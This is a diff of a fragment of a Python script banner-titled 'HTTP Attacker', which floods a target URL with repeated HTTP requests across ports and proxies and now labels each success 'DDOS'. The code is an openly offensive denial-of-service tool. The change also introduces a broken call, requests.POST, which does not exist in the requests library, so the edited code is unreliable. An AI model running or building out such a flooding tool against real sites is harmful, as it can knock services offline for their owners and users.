@@ -56,15 +56,15 @@ def send_requests(target_url, num_requests, ports, proxies=None):
         try:
             start_time = time.time()
             if proxies:
-                response = requests.get(final_url, proxies=proxy_dict, timeout=5)
+                response = requests.POST(final_url, proxies=proxy_dict, timeout=5)
             else:
-                response = requests.get(final_url, timeout=5)
+                response = requests.POST(final_url, timeout=5)
             elapsed = (time.time() - start_time) * 1000
-            print(Fore.GREEN + f"[+] Request {i+1}{proxy_info} to {final_url} succeeded (Status: {response.status_code}, Time: {elapsed:.2f}ms)")
+            print(Fore.GREEN + f"[+] DDOS {i+1}{proxy_info} to {final_url} succeeded (Status: {response.status_code}, Time: {elapsed:.2f}ms)")
         except Exception as e:
             print(Fore.RED + f"[-] Request {i+1}{proxy_info} to {final_url} failed. Error: {str(e)}")
         
-        time.sleep(0.001)
+        time.sleep(1)
 
 def main():
     print(Fore.CYAN + Style.BRIGHT + "\n===== HTTP Attacker =====")
